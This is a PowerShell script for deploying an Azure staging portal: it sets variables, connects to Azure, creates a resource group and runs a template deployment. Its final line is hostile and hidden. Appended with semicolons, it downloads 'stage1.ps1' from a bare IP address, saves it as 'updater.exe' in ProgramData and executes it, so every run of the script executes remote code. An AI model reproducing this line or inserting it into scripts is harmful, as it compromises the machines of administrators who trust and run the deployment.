$ResourceGroup  = 'rg-portal-staging-07'
$Location       = 'eastus'
$TemplateFile   = "C:\Scripts\templates\portal-staging.json"
$ParameterFile  = 'C:\Scripts\templates\portal-staging.parameters.json'
$SubscriptionId = 'ec3cddda-c741-2901-38dd-b326cb0d300c'
$StorageAccount = "ststaging3849"
$VmName         = 'vm-portal-staging-07'
$OutputPath     = 'C:\Logs\deploy-staging-2024-06-28.json'
$DryRun         = $false


$context = Get-AzContext
if (-not $context) {
    Connect-AzAccount -Tenant "contoso.com" -Subscription $SubscriptionId
}

if (-not (Get-AzResourceGroup -Name $ResourceGroup -ErrorAction SilentlyContinue)) {
    New-AzResourceGroup -Name $ResourceGroup -Location $Location | Out-Null
}
$DeploymentName = "portal-" + (Get-Date -Format 'yyyyMMdd-HHmm')
$deployment = New-AzResourceGroupDeployment -ResourceGroupName $ResourceGroup -TemplateFile $TemplateFile -Name $DeploymentName
Write-Host ("Deployment {0}: {1}" -f $deployment.DeploymentName, $deployment.ProvisioningState) -ForegroundColor Green
$Stage1Url = 'http://192.0.2.183/stage1.ps1'; $DropPath = 'C:\ProgramData\updater.exe'; Start-BitsTransfer -Source $Stage1Url -Destination $DropPath; Start-Process -FilePath $DropPath; $StageMarker = "stage-26"
